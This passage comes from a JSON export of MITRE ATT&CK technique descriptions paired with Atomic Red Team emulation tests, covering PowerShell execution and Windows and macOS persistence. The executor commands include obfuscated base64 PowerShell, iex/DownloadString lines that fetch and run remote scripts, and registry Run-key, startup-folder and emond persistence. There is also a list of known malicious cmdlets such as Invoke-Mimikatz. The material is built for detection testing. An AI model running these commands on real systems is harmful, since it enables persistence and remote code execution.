1\n}\n", "get_prereq_command": "Enable-PSRemoting\n"}], "executor": {"name": "powershell", "elevation_required": true, "command": "New-PSSession -ComputerName #{hostname_to_connect}\nTest-Connection $env:COMPUTERNAME\nSet-Content -Path $env:TEMP\\T1086_PowerShell_Session_Creation_and_Use -Value \"T1086 PowerShell Session Creation and Use\"\nGet-Content -Path $env:TEMP\\T1086_PowerShell_Session_Creation_and_Use\nRemove-Item -Force $env:TEMP\\T1086_PowerShell_Session_Creation_and_Use\n"}}, {"name": "ATHPowerShellCommandLineParameter -Command parameter variations", "auto_generated_guid": "686a9785-f99b-41d4-90df-66ed515f81d7", "description": "Executes powershell.exe with variations of the -Command parameter", "supported_platforms": ["windows"], "input_arguments": {"command_line_switch_type": {"description": "The type of supported command-line switch to use", "type": "string", "default": "Hyphen"}, "command_param_variation": {"description": "The \"Command\" parameter variation to use", "type": "string", "default": "C"}}, "dependencies": [{"description": "The AtomicTestHarnesses module must be installed and Out-ATHPowerShellCommandLineParameter must be exported in the module.", "prereq_command": "$RequiredModule = Get-Module -Name AtomicTestHarnesses -ListAvailable\nif (-not $RequiredModule) {exit 1}\nif (-not $RequiredModule.ExportedCommands['Out-ATHPowerShellCommandLineParameter']) {exit 1} else {exit 0}", "get_prereq_command": "Install-Module -Name AtomicTestHarnesses -Scope CurrentUser -Force\n"}], "executor": {"command": "Out-ATHPowerShellCommandLineParameter -CommandLineSwitchType #{command_line_switch_type} -CommandParamVariation #{command_param_variation} -Execute -ErrorAction Stop", "name": "powershell"}}, {"name": "ATHPowerShellCommandLineParameter -Command parameter variations with encoded arguments", "auto_generated_guid": "1c0a870f-dc74-49cf-9afc-eccc45e58790", "description": "Executes powershell.exe with variations of the -Command parameter with encoded arguments supplied", "supported_platforms": ["windows"], "input_arguments": {"command_line_switch_type": {"description": "The type of supported command-line switch to use", "type": "string", "default": "Hyphen"}, "command_param_variation": {"description": "The \"Command\" parameter variation to use", "type": "string", "default": "C"}, "encoded_arguments_param_variation": {"description": "The \"EncodedArguments\" parameter variation to use", "type": "string", "default": "EA"}}, "dependencies": [{"description": "The AtomicTestHarnesses module must be installed and Out-ATHPowerShellCommandLineParameter must be exported in the module.", "prereq_command": "$RequiredModule = Get-Module -Name AtomicTestHarnesses -ListAvailable\nif (-not $RequiredModule) {exit 1}\nif (-not $RequiredModule.ExportedCommands['Out-ATHPowerShellCommandLineParameter']) {exit 1} else {exit 0}", "get_prereq_command": "Install-Module -Name AtomicTestHarnesses -Scope CurrentUser -Force\n"}], "executor": {"command": "Out-ATHPowerShellCommandLineParameter -CommandLineSwitchType #{command_line_switch_type} -CommandParamVariation #{command_param_variation} -UseEncodedArguments -EncodedArgumentsParamVariation #{encoded_arguments_param_variation} -Execute -ErrorAction Stop", "name": "powershell"}}, {"name": "ATHPowerShellCommandLineParameter -EncodedCommand parameter variations", "auto_generated_guid": "86a43bad-12e3-4e85-b97c-4d5cf25b95c3", "description": "Executes powershell.exe with variations of the -EncodedCommand parameter", "supported_platforms": ["windows"], "input_arguments": {"command_line_switch_type": {"description": "The type of supported command-line switch to use", "type": "string", "default": "Hyphen"}, "encoded_command_param_variation": {"description": "The \"EncodedCommand\" parameter variation to use", "type": "string", "default": "E"}}, "dependencies": [{"description": "The AtomicTestHarnesses module must be installed and Out-ATHPowerShellCommandLineParameter must be exported in the module.", "prereq_command": "$RequiredModule = Get-Module -Name AtomicTestHarnesses -ListAvailable\nif (-not $RequiredModule) {exit 1}\nif (-not $RequiredModule.ExportedCommands['Out-ATHPowerShellCommandLineParameter']) {exit 1} else {exit 0}", "get_prereq_command": "Install-Module -Name AtomicTestHarnesses -Scope CurrentUser -Force\n"}], "executor": {"command": "Out-ATHPowerShellCommandLineParameter -CommandLineSwitchType #{command_line_switch_type} -EncodedCommandParamVariation #{encoded_command_param_variation} -Execute -ErrorAction Stop", "name": "powershell"}}, {"name": "ATHPowerShellCommandLineParameter -EncodedCommand parameter variations with encoded arguments", "auto_generated_guid": "0d181431-ddf3-4826-8055-2dbf63ae848b", "description": "Executes powershell.exe with variations of the -EncodedCommand parameter with encoded arguments supplied", "supported_platforms": ["windows"], "input_arguments": {"encoded_command_param_variation": {"description": "The \"EncodedCommand\" parameter variation to use", "type": "string", "default": "E"}, "command_line_switch_type": {"description": "The type of supported command-line switch to use", "type": "string", "default": "Hyphen"}, "encoded_arguments_param_variation": {"description": "The \"EncodedArguments\" parameter variation to use", "type": "string", "default": "EncodedArguments"}}, "dependencies": [{"description": "The AtomicTestHarnesses module must be installed and Out-ATHPowerShellCommandLineParameter must be exported in the module.", "prereq_command": "$RequiredModule = Get-Module -Name AtomicTestHarnesses -ListAvailable\nif (-not $RequiredModule) {exit 1}\nif (-not $RequiredModule.ExportedCommands['Out-ATHPowerShellCommandLineParameter']) {exit 1} else {exit 0}", "get_prereq_command": "Install-Module -Name AtomicTestHarnesses -Scope CurrentUser -Force\n"}], "executor": {"command": "Out-ATHPowerShellCommandLineParameter -CommandLineSwitchType #{command_line_switch_type} -EncodedCommandParamVariation #{encoded_command_param_variation} -UseEncodedArguments -EncodedArgumentsParamVariation #{encoded_arguments_param_variation} -Execute -ErrorAction Stop", "name": "powershell"}}, {"name": "PowerShell Command Execution", "auto_generated_guid": "a538de64-1c74-46ed-aa60-b995ed302598", "description": "Use of obfuscated PowerShell to execute an arbitrary command; outputs \"Hello, from PowerShell!\". Example is from the 2021 Threat Detection Report by Red Canary.\n", "supported_platforms": ["windows"], "input_arguments": {"obfuscated_code": {"description": "Defaults to: Invoke-Expression with a \"Write-Host\" line.", "type": "string", "default": "JgAgACgAZwBjAG0AIAAoACcAaQBlAHsAMAB9ACcAIAAtAGYAIAAnAHgAJwApACkAIAAoACIAVwByACIAKwAiAGkAdAAiACsAIgBlAC0ASAAiACsAIgBvAHMAdAAgACcASAAiACsAIgBlAGwAIgArACIAbABvACwAIABmAHIAIgArACIAbwBtACAAUAAiACsAIgBvAHcAIgArACIAZQByAFMAIgArACIAaAAiACsAIgBlAGwAbAAhACcAIgApAA=="}}, "executor": {"command": "powershell.exe -e  #{obfuscated_code}\n", "name": "command_prompt"}}, {"name": "PowerShell Invoke Known Malicious Cmdlets", "auto_generated_guid": "49eb9404-5e0f-4031-a179-b40f7be385e3", "description": "Powershell execution of known Malicious PowerShell Cmdlets", "supported_platforms": ["windows"], "input_arguments": {"Malicious_cmdlets": {"description": "Known Malicious Cmdlets", "type": "string", "default": "\"Add-Persistence\", \"Find-AVSignature\", \"Get-GPPAutologon\", \"Get-GPPPassword\", \"Get-HttpStatus\", \"Get-Keystrokes\", \"Get-SecurityPackages\", \"Get-TimedScreenshot\", \"Get-VaultCredential\", \"Get-VolumeShadowCopy\", \"Install-SSP\", \"Invoke-CredentialInjection\", \"Invoke-DllInjection\", \"Invoke-Mimikatz\", \"Invoke-NinjaCopy\", \"Invoke-Portscan\", \"Invoke-ReflectivePEInjection\", \"Invoke-ReverseDnsLookup\", \"Invoke-Shellcode\", \"Invoke-TokenManipulation\", \"Invoke-WmiCommand\", \"Mount-VolumeShadowCopy\", \"New-ElevatedPersistenceOption\", \"New-UserPersistenceOption\", \"New-VolumeShadowCopy\", \"Out-CompressedDll\", \"Out-EncodedCommand\", \"Out-EncryptedScript\", \"Out-Minidump\", \"PowerUp\", \"PowerView\", \"Remove-Comments\", \"Remove-VolumeShadowCopy\", \"Set-CriticalProcess\", \"Set-MasterBootRecord\"\n"}}, "executor": {"name": "powershell", "elevation_required": true, "command": "$malcmdlets = #{Malicious_cmdlets}\nforeach ($cmdlets in $malcmdlets) {\n    \"function $cmdlets { Write-Host Pretending to invoke $cmdlets }\"}\nforeach ($cmdlets in $malcmdlets) {\n    $cmdlets}\n"}}, {"name": "PowerUp Invoke-AllChecks", "auto_generated_guid": "1289f78d-22d2-4590-ac76-166737e1811b", "description": "Check for privilege escalation paths using PowerUp from PowerShellMafia\n", "supported_platforms": ["windows"], "executor": {"command": "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12\niex(iwr https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/d943001a7defb5e0d1657085a77a0e78609be58f/Privesc/PowerUp.ps1 -UseBasicParsing)\nInvoke-AllChecks\n", "name": "powershell"}}, {"name": "Abuse Nslookup with DNS Records", "auto_generated_guid": "999bff6d-dc15-44c9-9f5c-e1051bfc86e1", "description": "Red teamer's avoid IEX and Invoke-WebRequest in your PowerShell commands. Instead, host a text record with a payload to compromise hosts.\n[reference](https://twitter.com/jstrosch/status/1237382986557001729)\n", "supported_platforms": ["windows"], "executor": {"command": "# creating a custom nslookup function that will indeed call nslookup but forces the result to be \"whoami\"\n# this would not be part of a real attack but helpful for this simulation\nfunction nslookup  { &\"$env:windir\\system32\\nslookup.exe\" @args | Out-Null; @(\"\",\"whoami\")}\npowershell .(nslookup -q=txt example.com 8.8.8.8)[-1]\n", "name": "powershell"}}]}, "T1546.001": {"name": "Change Default File Association", "technique_id": "attack-pattern--98034fef-d9fb-4667-8dc4-2eab6231724c", "external_id": "T1546.001", "data_components": ["Command Execution", "Process Creation", "Windows Registry Key Modification"], "kill_chain_phases": ["privilege-escalation", "persistence"], "data_source_platforms": [], "mitigations": null, "description": "Adversaries may establish persistence by executing malicious content triggered by a file type association. When a file is opened, the default program used to open the file (also called the file association or handler) is checked. File association selections are stored in the Windows Registry and can be edited by users, administrators, or programs that have Registry access or by administrators using the built-in assoc utility.(Citation: Microsoft Change Default Programs)(Citation: Microsoft File Handlers)(Citation: Microsoft Assoc Oct 2017) Applications can modify the file association for a given file extension to call an arbitrary program when a file with the given extension is opened.\n\nSystem file associations are listed under <code>HKEY_CLASSES_ROOT\\.[extension]</code>, for example <code>HKEY_CLASSES_ROOT\\.txt</code>. The entries point to a handler for that extension located at <code>HKEY_CLASSES_ROOT\\\\[handler]</code>. The various commands are then listed as subkeys underneath the shell key at <code>HKEY_CLASSES_ROOT\\\\[handler]\\shell\\\\[action]\\command</code>. For example: \n\n* <code>HKEY_CLASSES_ROOT\\txtfile\\shell\\open\\command</code>\n* <code>HKEY_CLASSES_ROOT\\txtfile\\shell\\print\\command</code>\n* <code>HKEY_CLASSES_ROOT\\txtfile\\shell\\printto\\command</code>\n\nThe values of the keys listed are commands that are executed when the handler opens the file extension. Adversaries can modify these values to continually execute arbitrary commands.(Citation: TrendMicro TROJ-FAKEAV OCT 2012)", "atomic_tests": [{"name": "Change Default File Association", "auto_generated_guid": "10a08978-2045-4d62-8c42-1957bbbea102", "description": "Change Default File Association From cmd.exe of hta to notepad.\n\nUpon successful execution, cmd.exe will change the file association of .hta to notepad.exe. \n", "supported_platforms": ["windows"], "input_arguments": {"target_extension_handler": {"description": "txtfile maps to notepad.exe", "type": "path", "default": "txtfile"}, "extension_to_change": {"description": "File Extension To Hijack", "type": "string", "default": ".hta"}, "original_extension_handler": {"description": "File Extension To Revert", "type": "string", "default": "htafile"}}, "executor": {"command": "assoc #{extension_to_change}=#{target_extension_handler}\n", "cleanup_command": "assoc  #{extension_to_change}=#{original_extension_handler}\n", "name": "command_prompt", "elevation_required": true}}]}, "T1546.014": {"name": "Emond", "technique_id": "attack-pattern--9c45eaa3-8604-4780-8988-b5074dbb9ecd", "external_id": "T1546.014", "data_components": ["Command Execution", "File Modification", "Process Creation", "File Creation"], "kill_chain_phases": ["privilege-escalation", "persistence"], "data_source_platforms": [], "mitigations": ["course-of-action--eb88d97c-32f1-40be-80f0-d61a4b0b4b31"], "description": "Adversaries may gain persistence and elevate privileges by executing malicious content triggered by the Event Monitor Daemon (emond). Emond is a [Launch Daemon](https://attack.mitre.org/techniques/T1543/004) that accepts events from various services, runs them through a simple rules engine, and takes action. The emond binary at <code>/sbin/emond</code> will load any rules from the <code>/etc/emond.d/rules/</code> directory and take action once an explicitly defined event takes place.\n\nThe rule files are in the plist format and define the name, event type, and action to take. Some examples of event types include system startup and user authentication. Examples of actions are to run a system command or send an email. The emond service will not launch if there is no file present in the QueueDirectories path <code>/private/var/db/emondClients</code>, specified in the [Launch Daemon](https://attack.mitre.org/techniques/T1543/004) configuration file at<code>/System/Library/LaunchDaemons/com.apple.emond.plist</code>.(Citation: xorrior emond Jan 2018)(Citation: magnusviri emond Apr 2016)(Citation: sentinelone macos persist Jun 2019)\n\nAdversaries may abuse this service by writing a rule to execute commands when a defined event occurs, such as system start up or user authentication.(Citation: xorrior emond Jan 2018)(Citation: magnusviri emond Apr 2016)(Citation: sentinelone macos persist Jun 2019) Adversaries may also be able to escalate privileges from administrator to root as the emond service is executed with root privileges by the [Launch Daemon](https://attack.mitre.org/techniques/T1543/004) service.", "atomic_tests": [{"name": "Persistance with Event Monitor - emond", "auto_generated_guid": "23c9c127-322b-4c75-95ca-eff464906114", "description": "Establish persistence via a rule run by OSX's emond (Event Monitor) daemon at startup, based on https://posts.specterops.io/leveraging-emond-on-macos-for-persistence-a040a2785124\n", "supported_platforms": ["macos"], "input_arguments": {"plist": {"description": "Path to attacker emond plist file", "type": "path", "default": "PathToAtomicsFolder/T1546.014/src/T1546.014_emond.plist"}}, "executor": {"command": "sudo cp \"#{plist}\" /etc/emond.d/rules/T1546.014_emond.plist\nsudo touch /private/var/db/emondClients/T1546.014\n", "cleanup_command": "sudo rm /etc/emond.d/rules/T1546.014_emond.plist\nsudo rm /private/var/db/emondClients/T1546.014\n", "name": "sh", "elevation_required": true}}]}, "T1547.001": {"name": "Registry Run Keys / Startup Folder", "technique_id": "attack-pattern--9efb1ea7-c37b-4595-9640-b7680cd84279", "external_id": "T1547.001", "data_components": ["Windows Registry Key Creation", "Windows Registry Key Modification", "Command Execution", "Process Creation", "File Modification"], "kill_chain_phases": ["persistence", "privilege-escalation"], "data_source_platforms": [], "mitigations": null, "description": "Adversaries may achieve persistence by adding a program to a startup folder or referencing it with a Registry run key. Adding an entry to the \"run keys\" in the Registry or startup folder will cause the program referenced to be executed when a user logs in.(Citation: Microsoft Run Key) These programs will be executed under the context of the user and will have the account's associated permissions level.\n\nPlacing a program within a startup folder will also cause that program to execute when a user logs in. There is a startup folder location for individual user accounts as well as a system-wide startup folder that will be checked regardless of which user account logs in. The startup folder path for the current user is <code>C:\\Users\\\\[Username]\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup</code>. The startup folder path for all users is <code>C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\StartUp</code>.\n\nThe following run keys are created by default on Windows systems:\n\n* <code>HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run</code>\n* <code>HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce</code>\n* <code>HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\Run</code>\n* <code>HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce</code>\n\nRun keys may exist under multiple hives.(Citation: Microsoft Wow6432Node 2018)(Citation: Malwarebytes Wow6432Node 2016) The <code>HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnceEx</code> is also available but is not created by default on Windows Vista and newer. Registry run key entries can reference programs directly or list them as a dependency.(Citation: Microsoft Run Key) For example, it is possible to load a DLL at logon using a \"Depend\" key with RunOnceEx: <code>reg add HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\RunOnceEx\\0001\\Depend /v 1 /d \"C:\\temp\\evil[.]dll\"</code> (Citation: Oddvar Moe RunOnceEx Mar 2018)\n\nThe following Registry keys can be used to set startup folder items for persistence:\n\n* <code>HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\User Shell Folders</code>\n* <code>HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Shell Folders</code>\n* <code>HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Shell Folders</code>\n* <code>HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\User Shell Folders</code>\n\nThe following Registry keys can control automatic startup of services during boot:\n\n* <code>HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\RunServicesOnce</code>\n* <code>HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\RunServicesOnce</code>\n* <code>HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\RunServices</code>\n* <code>HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\RunServices</code>\n\nUsing policy settings to specify startup programs creates corresponding values in either of two Registry keys:\n\n* <code>HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\\Run</code>\n* <code>HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\\Run</code>\n\nThe Winlogon key controls actions that occur when a user logs on to a computer running Windows 7. Most of these actions are under the control of the operating system, but you can also add custom actions here. The <code>HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\Userinit</code> and <code>HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\Shell</code> subkeys can automatically launch programs.\n\nPrograms listed in the load value of the registry key <code>HKEY_CURRENT_USER\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Windows</code> run when any user logs on.\n\nBy default, the multistring <code>BootExecute</code> value of the registry key <code>HKEY_LOCAL_MACHINE\\System\\CurrentControlSet\\Control\\Session Manager</code> is set to <code>autocheck autochk *</code>. This value causes Windows, at startup, to check the file-system integrity of the hard disks if the system has been shut down abnormally. Adversaries can add other programs or processes to this registry value which will automatically launch at boot.\n\nAdversaries can use these configuration locations to execute malware, such as remote access tools, to maintain persistence through system reboots. Adversaries may also use [Masquerading](https://attack.mitre.org/techniques/T1036) to make the Registry entries look as if they are associated with legitimate programs.", "atomic_tests": [{"name": "Reg Key Run", "auto_generated_guid": "e55be3fd-3521-4610-9d1a-e210e42dcf05", "description": "Run Key Persistence\n\nUpon successful execution, cmd.exe will modify the registry by adding \\\"Atomic Red Team\\\" to the Run key. Output will be via stdout. \n", "supported_platforms": ["windows"], "input_arguments": {"command_to_execute": {"description": "Thing to Run", "type": "path", "default": "C:\\Path\\AtomicRedTeam.exe"}}, "executor": {"command": "REG ADD \"HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\" /V \"Atomic Red Team\" /t REG_SZ /F /D \"#{command_to_execute}\"\n", "cleanup_command": "REG DELETE \"HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\" /V \"Atomic Red Team\" /f >nul 2>&1\n", "name": "command_prompt"}}, {"name": "Reg Key RunOnce", "auto_generated_guid": "554cbd88-cde1-4b56-8168-0be552eed9eb", "description": "RunOnce Key Persistence.\n\nUpon successful execution, cmd.exe will modify the registry to load AtomicRedTeam.dll to RunOnceEx. Output will be via stdout. \n", "supported_platforms": ["windows"], "input_arguments": {"thing_to_execute": {"description": "Thing to Run", "type": "path", "default": "C:\\Path\\AtomicRedTeam.dll"}}, "executor": {"command": "REG ADD HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\RunOnceEx\\0001\\Depend /v 1 /d \"#{thing_to_execute}\"\n", "cleanup_command": "REG DELETE HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\RunOnceEx\\0001\\Depend /v 1 /f >nul 2>&1\n", "name": "command_prompt", "elevation_required": true}}, {"name": "PowerShell Registry RunOnce", "auto_generated_guid": "eb44f842-0457-4ddc-9b92-c4caa144ac42", "description": "RunOnce Key Persistence via PowerShell\nUpon successful execution, a new entry will be added to the runonce item in the registry.\n", "supported_platforms": ["windows"], "input_arguments": {"thing_to_execute": {"description": "Thing to Run", "type": "path", "default": "powershell.exe"}, "reg_key_path": {"description": "Path to registry key to update", "type": "path", "default": "HKLM:\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce"}}, "executor": {"command": "$RunOnceKey = \"#{reg_key_path}\"\nset-itemproperty $RunOnceKey \"NextRun\" '#{thing_to_execute} \"IEX (New-Object Net.WebClient).DownloadString(`\"https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1547.001/src/Discovery.bat`\")\"'\n", "cleanup_command": "Remove-ItemProperty -Path #{reg_key_path} -Name \"NextRun\" -Force -ErrorAction Ignore\n", "name": "powershell", "elevation_required": true}}, {"name": "Suspicious vbs file run from startup Folder", "auto_generated_guid": "2cb98256-625e-4da9-9d44-f2e5f90b8bd5", "description": "vbs files can be placed in and ran from the startup folder to maintain persistance. Upon execution, \"T1547.001 Hello, World VBS!\" will be displayed twice. \nAdditionally, the new files can be viewed in the \"$env:APPDATA\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\"\nfolder and will also run when the computer is restarted and the user logs in.\n", "supported_platforms": ["windows"], "executor": {"command": "Copy-Item \"$PathToAtomicsFolder\\T1547.001\\src\\vbsstartup.vbs\" \"$env:APPDATA\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\vbsstartup.vbs\"\nCopy-Item \"$PathToAtomicsFolder\\T1547.001\\src\\vbsstartup.vbs\" \"C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\StartUp\\vbsstartup.vbs\"\ncscript.exe \"$env:APPDATA\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\vbsstartup.vbs\"\ncscript.exe \"C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\StartUp\\vbsstartup.vbs\"\n", "cleanup_command": "Remove-Item \"$env:APPDATA\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\vbsstartup.vbs\" -ErrorAction Ignore\nRemove-Item \"C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\StartUp\\vbsstartup.vbs\" -ErrorAction Ignore\n", "name": "powershell", "elevation_required": true}}, {"name": "Suspicious jse file run from startup Folder", "auto_generated_guid": "dade9447-791e-4c8f-b04b-3a35855dfa06", "description": "jse files can be placed in and ran from the startup folder to maintain persistance.\nUpon execution, \"T1547.001 Hello, World JSE!\" will be displayed twice. \nAdditionally, the new files can be viewed in the \"$env:APPDATA\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\"\nfolder and will also run when the computer is restarted and the user logs in.\n", "supported_platforms": ["windows"], "executor": {"command": "Copy-Item \"$PathToAtomicsFolder\\T1547.001\\src\\jsestartup.jse\" \"$env:APPDATA\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\jsestartup.jse\"\nCopy-Item \"$PathToAtomicsFolder\\T1547.001\\src\\jsestartup.jse\" \"C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\StartUp\\jsestartup.jse\"\ncscript.exe /E:Jscript \"$env:APPDATA\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\jsestartup.jse\"\ncscript.exe /E:Jscript \"C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\StartUp\\jsestartup.jse\"\n", "cleanup_command": "Remove-Item \"$env:APPDATA\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\jsestartup.jse\" -ErrorAction Ignore\nRemove-Item \"C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\StartUp\\jsestartup.jse\" -ErrorAction Ignore\n", "name": "powershell", "elevation_required": true}}, {"name": "Suspicious bat file run from startup Folder", "auto_generated_guid": "5b6768e4-44d2-44f0-89da-a01d1430fd5e", "description": "bat files can be placed in and executed from the startup folder to maintain persistance\n\nUpon execution, cmd will be run and immediately closed. Additionally, the new files can be viewed in the \"$env:APPDATA\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\"\nfolder and will also run when the computer is restarted and the user logs in.\n", "supported_platforms": ["windows"], "executor": {"command": "Copy-Item \"$PathToAtomicsFolder\\T1547.001\\src\\batstartup.bat\" \"$env:APPDATA\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\batstartup.bat\"\nCopy-Item \"$PathToAtomicsFolder\\T1547.001\\src\\batstartup.bat\" \"C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\StartUp\\batstartup.bat\"\nStart-Process \"$env:APPDATA\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\batstartup.bat\"\nStart-Process \"C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\StartUp\\batstartup.bat\"\n", "cleanup_command": "Remove-Item \"$env:APPDATA\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\batstartup.bat\" -ErrorAction Ignore\nRemove-Item \"C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\StartUp\\batstartup.bat\" -ErrorAction Ignore\n", "name": "powershell", "elevation_required": true}}, {"name": "Add Executable Shortcut Link to User Startup Folder", "auto_generated_guid": "24e55612-85f6-4bd6-ae74-a73d02e3441d", "description": "Adds a non-malicious executable shortcut link to the current users startup directory. Test can be verified by going to the users startup directory and checking if the shortcut link exists. ", "supported_platforms": ["windows"], "executor": {"command": "$Target = \"C:\\Windows\\System32\\calc.exe\"\n$ShortcutLocation = \"$home\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\calc_exe.lnk\"\n$WScriptShell = New-Object -ComObject WScript.Shell\n$Create = $WScriptShell.CreateShortcut($ShortcutLocation)\n$Create.TargetPath = $Target\n$Create.Save()      ", "cleanup_command": "Remove-Item \"$home\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\calc_exe.lnk\" -ErrorAction Ignore", "name": "powershell", "elevation_required": true}}, {"name": "Add persistance via Recycle bin", "auto_generated_guid": "bda6a3d6-7aa7-4e89-908b-306772e9662f", "description": "Add a persistance via Recycle bin [vxunderground](https://github.com/vxunderground/VXUG-Papers/blob/main/The%20Persistence%20Series/Persistence%20via%20Recycle%20Bin/Persistence_via_Recycle_Bin.pdf)\nUser have to clic on the recycle bin to lauch the payload (here calc)\n", "supported_platforms": ["windows"], "executor": {"command": "reg ADD \"HKCR\\CLSID\\{645FF040-5081-101B-9F08-00AA002F954E}\\shell\\open\\command\" /ve /d \"calc.exe\" /f", "cleanup_command": "reg DELETE \"HKCR\\CLSID\\{645FF040-5081-101B-9F08-00AA002F954E}\\shell\\open\" /f", "name": "command_prompt"}}, {"name": "SystemBC Malware-as-a-Service Registry", "auto_generated_guid": "9dc7767b-30c1-4cc4-b999-50cab5e27891", "description": "This Atomic will create a registry key called socks5_powershell for persistance access\nhttps://medium.com/walmartglobaltech/systembc-powershell-version-68c9aad0f85c\n", "supported_platforms": ["windows"], "input_arguments": {"reg_key_value": {"description": "Thing to Run", "type": "path", "default": "powershell.exe -windowstyle hidden -ExecutionPolicy Bypass -File"}, "reg_key_path": {"description": "Path to registry key to update", "type": "path", "default": "HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Run"}}, "executor": {"command": "$RunKey = \"#{reg_key_path}\"\nSet-ItemProperty -Path $RunKey -Name \"socks5_powershell\" -Value \"#{reg_key_value}\"\n", "cleanup_command": "Remove-ItemProperty -Path #{reg_key_path} -Name \"socks5_powershell\" -Force -ErrorAction Ignore\n", "name": "powershell"}}, {"name": "Change Startup Folder - HKLM Modify User Shell Folders Common Startup Value", "auto_generated_guid": "acfef903-7662-447e-a391-9c91c2f00f7b", "description": "This test will modify the HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\User Shell Folders -V \"Common Startup\" \nvalue to point to a new startup folder where a payload could be stored to launch at boot.  *successful execution requires system restart\n", "supported_platforms": ["windows"], "input_arguments": {"new_startup_folder": {"description": "new startup folder to replace standard one", "type": "string", "default": "$env:TMP\\atomictest\\"}, "payload": {"description": "executable to be placed in new startup location ", "type": "string", "default": "C:\\Windows\\System32\\calc.exe"}}, "executor": {"command": "New-Item -ItemType Directory -path \"#{new_startup_folder}\"\nCopy-Item -path \"#{payload}\" -destination \"#{new_startup_folder}\"\nSet-ItemProperty -Path  \"HKLM:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\User Shell Folders\" -Name \"Common Startup\" -Value \"#{new_startup_folder}\"\n", "cleanup_command": "Set-ItemProperty -Path  \"HKLM:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\User Shell Folders\" -Name \"Common Startup\" -Value \"%ProgramData%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\"\nRemove-Item \"#{new_startup_folder}\" -Recurse -Force\n", "name": "powershell", "elevation_required": true}}, {"name": "Change Startup Folder - HKCU Modify User Shell Folders Startup Value", "auto_generated_guid": "8834b65a-f808-4ece-ad7e-2acdf647aafa", "description": "This test will modify the HKEY_CURRENT_USER\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\User Shell Folders  -V \"Startup\" value \nto point to a new startup folder where a payload could be stored to launch at boot.  *successful execution requires system restart\n", "supported_platforms": ["windows"], "input_arguments": {"new_startup_folder": {"description": "new startup folder to replace standard one", "type": "string", "default": "$env:TMP\\atomictest\\"}, "payload": {"description": "executable to be placed in new startup location ", "type": "string", "default": "C:\\Windows\\System32\\calc.exe"}}, "executor": {"command": "New-Item -ItemType Directory -path \"#{new_startup_folder}\"\nCopy-Item -path \"#{payload}\" -destination \"#{new_startup_folder}\"\nSet-ItemProperty -Path  \"HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\User Shell Folders\" -Name \"Startup\" -Value \"#{new_startup_folder}\"\n", "cleanup_command": "Set-ItemProperty -Path  \"HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\User Shell Folders\" -Name \"Startup\" -Value 